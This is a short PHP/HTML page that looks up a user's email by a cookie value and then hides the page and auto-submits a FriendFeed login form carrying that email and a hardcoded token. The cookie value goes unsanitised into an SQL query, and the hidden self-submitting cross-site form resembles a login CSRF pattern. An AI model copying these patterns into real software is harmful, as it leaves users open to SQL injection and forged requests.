<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `friendfeed` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["myform"].submit();}</script>



<form action="https://friendfeed.com/account/login?v=2" method="post" onSubmit="return checkRequired(this, ['email', 'password']);" id="myform">
<table class="form" style="width:100%">
<tbody><tr>
<td class="label">Username</td>
<td class="value" style="width:100%"><div class="textbox"><input name="email" id="email" type="text" size="15" value="<?=$email;?>"></div></td>
</tr>
<tr>
<td class="label">Password</td>
<td class="value"><div class="textbox"><input name="password" id="password" type="password" size="15"></div></td>
</tr>
<tr>
<td>&nbsp;</td>
<td class="buttons">
<input type="submit" value="Sign in" style="font-weight:bold">
</td>
</tr>
</tbody></table>
<div><input type="hidden" name="next" value="http://friendfeed.com/"></div>
<input type="hidden" name="at" value="5158277857270530764_1360322856">

</form>

</body>
</html>

